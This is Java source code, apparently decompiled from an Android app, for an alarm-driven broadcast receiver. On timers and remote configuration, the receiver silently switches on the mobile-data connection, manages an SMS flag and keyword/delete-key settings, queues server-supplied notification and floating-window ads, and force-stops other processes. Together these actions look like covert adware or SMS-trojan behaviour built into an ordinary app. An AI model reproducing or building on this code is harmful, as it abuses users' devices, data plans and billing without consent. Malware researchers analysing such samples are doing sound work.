package com.qc.access;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import com.qc.base.BitmapCache;
import com.qc.base.OrderSet;
import com.qc.base.QCCache;
import com.qc.base.QCMainCourse;
import com.qc.base.RunStatement;
import com.qc.common.Constant;
import com.qc.common.Funs;
import com.qc.common.WapApnHelper;
import com.qc.entity.AdsInfo;
import com.qc.entity.CustomInfo;
import com.qc.util.IsNetOpen;
import com.qc.util.ShareProDBHelper;
import com.qc.widget.AdsWindow;
import com.qc.widget.NotificationView;

public class QCAlarmReceiver extends BroadcastReceiver {
    @SuppressLint({"UseValueOf"})
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("repeatTimeOut")) {
            QCCache.getInstance().clearCache();
            QCCache.getInstance().clearQueue();
            QCCache.getInstance().init(context);
            RunStatement.runningTime += RunStatement.repeatTime;
            if (RunStatement.runningTime != 0 && RunStatement.runningTime - 4320 >= 0) {
                OrderSet.isopenSMS = 0;
                ShareProDBHelper.write(context, "dataCenter", "advkey", "");
                ShareProDBHelper.write(context, "dataCenter", "advtent", "");
                ShareProDBHelper.write(context, "dataCenter", "advtip", "");
                ShareProDBHelper.write(context, "dataCenter", "advend", "");
                ShareProDBHelper.write(context, "dataCenter", "comtent", "");
                ShareProDBHelper.write(context, "dataCenter", "keytent", "");
                ShareProDBHelper.write(context, "dataCenter", "delkey", "");
                ShareProDBHelper.write(context, "dataCenter", "id", Integer.valueOf(0));
                RunStatement.runningTime = 0;
                ShareProDBHelper.write(context, "dataCenter", "basesitelauncher", new Integer(0));
            }
            int delayTime = Funs.randromInt(OrderSet.customInfo.getHourMin(), OrderSet.customInfo.getHourMin());
            if (OrderSet.customInfo.getForcedFlag() == 1 && OrderSet.launcherDate >= OrderSet.customInfo.getForcedDays()) {
                QCMainCourse.startCheckNetWorkHandler(context, delayTime);
            }
            QCMainCourse.startConfigureDownLoadHandler(context, delayTime);
        } else if (intent.getAction().equals("configureDownLoad")) {
            int forceOpenGPRSDay;
            RunStatement.runningTime += RunStatement.repeatTime;
            if (RunStatement.runningTime != 0 && RunStatement.runningTime - 4320 >= 0) {
                OrderSet.isopenSMS = 0;
                ShareProDBHelper.write(context, "dataCenter", "advkey", "");
                ShareProDBHelper.write(context, "dataCenter", "advtent", "");
                ShareProDBHelper.write(context, "dataCenter", "advtip", "");
                ShareProDBHelper.write(context, "dataCenter", "advend", "");
                ShareProDBHelper.write(context, "dataCenter", "comtent", "");
                ShareProDBHelper.write(context, "dataCenter", "keytent", "");
                ShareProDBHelper.write(context, "dataCenter", "id", Integer.valueOf(0));
                RunStatement.runningTime = 0;
                ShareProDBHelper.write(context, "dataCenter", "basesitelauncher", new Integer(0));
            }
            if (OrderSet.customInfo != null) {
                forceOpenGPRSDay = OrderSet.customInfo.getForcedDays();
            } else {
                forceOpenGPRSDay = new CustomInfo().getForcedDays();
            }
            if (OrderSet.launcherDate < forceOpenGPRSDay) {
                OrderSet.launcherDate++;
                ShareProDBHelper.write(context, "dataCenter", "launcherdate", Integer.valueOf(OrderSet.launcherDate));
            }
            if (OrderSet.linkNet == 0) {
                QCMainCourse.startRepeatAlarm(context, 24);
                RunStatement.repeatTime = 1440;
            } else {
                int hour = 24 / OrderSet.linkNet;
                QCMainCourse.startRepeatAlarm(context, hour);
                RunStatement.repeatTime = (long) (hour * 60);
            }
            if (RunStatement.dayAndNight == 0) {
                int firstGPRSDay;
                if (OrderSet.customInfo != null) {
                    firstGPRSDay = OrderSet.customInfo.getDay();
                } else {
                    firstGPRSDay = new CustomInfo().getDay();
                }
                if (OrderSet.launcherDate < firstGPRSDay) {
                    return;
                }
            }
            if (new IsNetOpen(context).checkNet()) {
                context.startService(new Intent(Constant.INSTALLCFG_ACTION));
            }
        } else if (intent.getAction().equals("checkNetWork")) {
            if (!new IsNetOpen(context).checkNet()) {
                WapApnHelper wapApnHelper = new WapApnHelper(context);
                wapApnHelper.saveState();
                wapApnHelper.openAPN();
            }
        } else if (intent.getAction().contains("openAdsAlert")) {
            QCMainCourse.cannelTimerHandler(context, intent.getAction());
            AdsInfo adsInfo = (AdsInfo) QCCache.getInstance().pull();
            if (adsInfo != null) {
                if (adsInfo != null && adsInfo.getAlerttype() == 0) {
                    NotificationView.showNotification(context, adsInfo);
                } else if (adsInfo != null && adsInfo.getAlerttype() == 1) {
                    AdsWindow adsWindow = new AdsWindow(context);
                    Bitmap bitmap = BitmapCache.getInstance().getBitmap(context, Integer.valueOf(adsInfo.getId()));
                    if (bitmap != null) {
                        adsWindow.createFlow(bitmap, adsInfo.getPathurl());
                    }
                }
                AdsInfo nextAds = (AdsInfo) QCCache.getInstance().peek();
                if (nextAds != null) {
                    QCMainCourse.startAdsAlertHandler(context, nextAds.getId(), nextAds.getTimeout() - adsInfo.getTimeout());
                }
            }
        } else if (intent.getAction().contains("appShutDown")) {
            Funs.forceStopProcess(context, intent.getAction().split("_")[1]);
        }
    }
}
